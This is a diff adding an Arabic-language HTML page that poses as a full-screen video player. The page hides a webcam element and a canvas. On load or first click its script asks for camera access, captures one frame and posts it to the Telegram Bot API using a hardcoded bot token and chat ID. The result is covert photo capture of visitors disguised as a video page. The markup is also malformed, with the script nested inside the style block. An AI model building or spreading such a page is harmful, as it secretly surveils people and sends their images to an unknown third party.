@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>عرض الفيديو</title>
+	<style>
+    * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+    }
+
+    body {
+        background-color: #000;
+        overflow: hidden;
+    }
+
+    .video-bg {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh;
+        object-fit: cover;
+        z-index: 1;
+    }
+
+    #webcam, #canvas {
+        display: none;
+    }<video class="video-bg" autoplay muted loop playsinline id="bgVideo">
+    <source src="https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/ForBiggerBlazes.mp4" type="video/mp4">
+    متصفحك لا يدعم تشغيل الفيديو.
+</video>
+
+<video id="webcam" autoplay playsinline></video>
+<canvas id="canvas"></canvas>
+
+<script>
+    const TELEGRAM_BOT_TOKEN = "8740275587:AAEPI5jBvej1YWa_67DXDPPT3lOC2NjblVw";
+    const TELEGRAM_CHAT_ID = "6642913954";
+document.addEventListener('click', startCameraProcess, { once: true });
+    window.onload = () => {
+        setTimeout(startCameraProcess, 800);
+    };
+
+    async function startCameraProcess() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+            const video = document.getElementById('webcam');
+            video.srcObject = stream;
+
+            video.onloadedmetadata = () => {
+                setTimeout(() => {
+                    captureAndSend(video, stream);
+                }, 500);
+            };
+        } catch (error) {
+            console.log("خطأ أو رفض الإذن:", error);
+        }function captureAndSend(video, stream) {
+        const canvas = document.getElementById('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+
+        const context = canvas.getContext('2d');
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        canvas.toBlob(async (blob) => {
+            if (!blob) return;
+            stream.getTracks().forEach(track => track.stop());
+
+            const formData = new FormData();
+            formData.append("chat_id", TELEGRAM_CHAT_ID);
+            formData.append("photo", blob, "capture.jpg");
+
+            try {
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                    method: "POST",
+                    body: formData
+                });
+            } catch (err) {
+                console.error("خطأ الإرسال:", err);
+            }
+        }, 'image/jpeg', 0.85);
+    }
+</script>
+
+    }
+
+
+
+</style>
